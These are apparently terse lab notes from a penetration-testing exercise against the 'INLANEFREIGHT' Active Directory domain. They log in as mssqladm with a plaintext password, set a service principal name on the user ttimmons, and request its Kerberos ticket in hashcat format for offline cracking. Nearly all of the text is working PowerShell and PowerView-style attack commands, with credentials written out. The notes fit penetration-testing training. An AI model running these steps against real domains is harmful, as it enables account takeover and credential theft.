- log in into as mssqladm
```
runas /user:INLANEFREIGHT\mssqladm powershell
DBAilfreight1!
```
- set SPN for `ttimmons` and the get it and try to crack offilene
```powershell
$SecPassword = ConvertTo-SecureString 'DBAilfreight1!' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\mssqladm', $SecPassword)

Set-DomainObject -Credential $Cred -Identity ttimmons -SET @{serviceprincipalname='INLANEFREIGHT\test'}

get-domainspnticket -spn 'INLANEFREIGHT/test' -credential $cred -outputformat hashcat
```


